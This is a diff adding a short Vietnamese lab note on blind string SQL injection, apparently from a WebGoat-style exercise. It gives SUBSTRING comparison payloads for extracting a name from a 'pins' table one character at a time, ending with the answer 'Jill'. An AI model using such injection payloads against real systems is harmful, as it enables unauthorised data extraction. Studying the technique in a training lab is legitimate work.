@@ -1,0 +1,21 @@
+Tuong t? v?i Blind Numeric SQL Injection ta cung dùng code d? dò
+
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'R' ); 
+
+   *Account number is valid => Ch? c?n tìm nh? hon ch? R
+(nh? hon ? dây là xét theo b?ng mã ASCII)
+
+Sau khi tìm ra ch? d?u thì ta t?i ch? ti?p theo
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) > 't' ); 
+
+   *Invalid account number =>  Ch? c?n tìm nh? hon ch? t
+
+
+Và c? thong th? mà dò nhé =]]
+
+
+
+
+
+
+Jill
